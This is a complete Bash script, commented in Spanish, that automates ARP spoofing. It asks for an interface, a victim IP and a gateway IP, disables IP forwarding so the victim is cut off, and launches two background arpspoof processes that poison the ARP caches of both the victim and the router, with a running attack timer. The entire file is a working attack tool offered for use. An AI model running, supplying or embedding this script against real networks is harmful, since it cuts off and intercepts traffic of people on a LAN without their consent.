#!/bin/bash

# --- Definición de Colores ---
# Se han mantenido los nombres de las variables originales para consistencia.
colorVerde="\e[0;32m\033[1m"
finColor="\033[0m\e[0m"
colorRojo="\e[0;31m\033[1m"
colorAzul="\e[0;34m\033[1m"
colorAmarillo="\e[0;33m\033[1m"
colorPurpura="\e[0;35m\033[1m"
colorTurquesa="\e[0;36m\033[1m"
colorGris="\e[0;37m\033[1m"

# --- Función de Limpieza (se activa con Ctrl+C) ---
# Se define al principio para que esté disponible en todo el script.
function limpieza() {
    stty echo # <-- AÑADE ESTA LÍNEA PRIMERO
    echo -e "\n\n${colorRojo}[!] Stopping the attack and restoring the configuration...${finColor}"
    # Re-enables IP forwarding
    sysctl -w net.ipv4.ip_forward=1 > /dev/null
    
    # Stops the background arpspoof processes
    pkill arpspoof
    
    echo -e "${colorVerde}[+] Done! Exiting safely.${finColor}"
    exit 0
}

# Captura la señal de interrupción (Ctrl+C) y llama a la función de limpieza
trap limpieza SIGINT

# --- Comprobación de Privilegios y Dependencias ---

# Comprueba si el script se ejecuta como superusuario (root)
if [[ $EUID -ne 0 ]]; then
   echo -e "${colorRojo}[!] Error: Este script debe ser ejecutado con privilegios de superusuario (sudo).${finColor}"
   exit 1
fi

# Comprueba si el comando 'arpspoof' existe
if ! command -v arpspoof &> /dev/null; then
    echo -e "${colorAmarillo}[!] La herramienta 'arpspoof' (del paquete dsniff) no está instalada.${finColor}"
    read -e -p "    ¿Deseas instalarla ahora? (S/n): " respuesta

    # Si la respuesta es 'S' o 's' (o si se presiona Enter)
    if [[ "$respuesta" =~ ^[Ss]?$ ]]; then
        echo -e "${colorVerde}[+] Intentando instalar 'dsniff'...${finColor}"
        apt-get update > /dev/null
        apt-get install -y dsniff > /dev/null

        # Vuelve a comprobar si la instalación fue exitosa
        if ! command -v arpspoof &> /dev/null; then
             echo -e "${colorRojo}[!] Error: No se pudo instalar 'dsniff'. Por favor, instálalo manualmente.${finColor}"
             exit 1
        fi
        echo -e "${colorVerde}[+] 'dsniff' se ha instalado correctamente.${finColor}"
    else
        echo -e "${colorRojo}[!] Instalación cancelada por el usuario. El script no puede continuar.${finColor}"
        exit 1
    fi
fi

# Comprueba si el comando 'neofetch' existe (opcional)
if ! command -v neofetch &> /dev/null; then
    echo -e "${colorAmarillo}[!] La herramienta 'neofetch' no está instalada (es opcional).${finColor}"
    read -e -p "    ¿Deseas instalarla ahora? (S/n): " respuesta

    # Si la respuesta es 'S' o 's' (o si se presiona Enter)
    if [[ "$respuesta" =~ ^[Ss]?$ ]]; then
        echo -e "${colorVerde}[+] Intentando instalar 'neofetch'...${finColor}"
        apt-get update > /dev/null
        apt-get install -y neofetch > /dev/null

        # Vuelve a comprobar si la instalación fue exitosa
        if ! command -v neofetch &> /dev/null; then
             echo -e "${colorRojo}[!] Error: No se pudo instalar 'neofetch'. El script continuará sin esta función visual.${finColor}"
        else
             echo -e "${colorVerde}[+] 'neofetch' se ha instalado correctamente.${finColor}"
        fi
    else
        echo -e "${colorAmarillo}[!] Instalación de 'neofetch' omitida. El script continuará.${finColor}"
    fi
    # Pequeña pausa para que el usuario pueda leer el mensaje antes de que la pantalla se limpie.
    sleep 2
fi

# --- Inicio del Script ---
clear
neofetch 

echo -e "${colorAzul}"
cat << "EOF"
        __________  _____  _________    ______ _______  _______  ________   
        \______   \/  |  | \_   ___ \  /  __  \\   _  \ \   _  \ \______ \  
         |     ___/   |  |_/    \  \/  >      </  /_\  \/  /_\  \ |    |  \ 
         |    |  /    ^   /\     \____/   --   \  \_/   \  \_/   \|    `   \
         |____|  \____   |  \______  /\______  /\_____  /\_____  /_______  /
                      |__|         \/        \/       \/       \/        \/ 
EOF
echo -e "${finColor}"


echo -e "${colorAzul}      ============================================================================${finColor}"
echo -e "${colorTurquesa}      Bienvenido a la herramienta para realizar ARP Spoofing de manera automatica${finColor}"
echo -e "${colorAzul}      ============================================================================${finColor}"
sleep 2

# --- Selección de Interfaz de Red ---
echo -e
echo -e "${colorAzul}[+] Por favor, selecciona tu interfaz de red:${finColor}"

# Guarda las interfaces de red en un array llamado "interfaces"
interfaces=($(ls /sys/class/net))
i=1

# Recorre el array para mostrar un menú numerado
# Bucle para mostrar el menú con la nueva combinación de colores
for interfaz_actual in "${interfaces[@]}"; do
  # NÚMEROS en Turquesa e INTERFACES en Gris/Blanco
  echo -e "  ${colorTurquesa}[$i]${finColor} ${colorGris}$interfaz_actual${finColor}"
  ((i++))
done
echo ""

# Pide al usuario que introduzca un número y lo guarda en la variable
read -e -p "Introduce el número de tu interfaz de red: " numero_interfaz

# --- VALIDACIÓN Y SELECCIÓN DE INTERFAZ (ESTA PARTE ES LA CORRECCIÓN CLAVE) ---
# Resta 1 al número introducido porque los arrays en bash empiezan en 0
indice_seleccionado=$((numero_interfaz - 1))

# Comprueba si el número es válido
if [[ -z "${interfaces[$indice_seleccionado]}" ]]; then
    echo -e "${colorRojo}[!] Selección inválida. Por favor, ejecuta el script de nuevo.${finColor}"
    exit 1
fi

# Guarda el nombre de la interfaz seleccionada en una nueva variable
interfaz_seleccionada="${interfaces[$indice_seleccionado]}"

echo -e "${colorVerde}[+] Has seleccionado la interfaz: ${colorAmarillo}$interfaz_seleccionada${finColor}"
sleep 1
clear
neofetch
# --- Petición de IPs ---
echo -e
echo -e "${colorAzul}[+] Ahora, proporciona los siguientes datos:${finColor}"
read -e -p "Introduce la dirección IP de la víctima: " ip_victima
read -e -p "Introduce la dirección IP del router (gateway): " ip_gateway
clear
neofetch
echo -e "${colorVerde}[+] Todo listo. La víctima es ${colorAmarillo}$ip_victima${colorVerde} y el router es ${colorAmarillo}$ip_gateway${finColor}."
sleep 2

# --- Inicio del Ataque ---
echo -e "${colorAzul}=============================${finColor}"
echo -e "${colorTurquesa}   Todo listo para empezar${finColor}"
echo -e "${colorAzul}=============================${finColor}"
read -e -p "$(echo -e ${colorRojo}"[!] Presiona Enter para comenzar el ataque..."${finColor})"

echo -e "\n${colorVerde}[+] Lanzando el ataque en segundo plano...${finColor}"

# Deshabilita el reenvío de IP para asegurar un DoS a la víctima
sysctl -w net.ipv4.ip_forward=0 > /dev/null

# Lanza los dos comandos de arpspoof en segundo plano
# -i: Interfaz, -t: Target (objetivo)
arpspoof -i $interfaz_seleccionada -t $ip_victima $ip_gateway &> /dev/null &
arpspoof -i $interfaz_seleccionada -t $ip_gateway $ip_victima &> /dev/null &

echo -e "${colorVerde}[+] The attack has started. ${colorRojo}Press Ctrl+C to stop it.${finColor}"

# --- Time Counter ---
echo ""
stty -echo # <-- AÑADE ESTA LÍNEA para desactivar el eco del teclado
segundos=0
while true; do
  # Formats the seconds into a readable HH:MM:SS format
  tiempo_formateado=$(printf '%02d:%02d:%02d' $((segundos/3600)) $((segundos%3600/60)) $((segundos%60)))
  # The \r moves the cursor to the beginning of the line without a newline
  echo -ne "${colorVerde}[+] Attack in progress. Time elapsed: ${colorAmarillo}${tiempo_formateado}${finColor}\r"
  sleep 1 # <-- Volvemos a usar sleep 1
  ((segundos++))
done
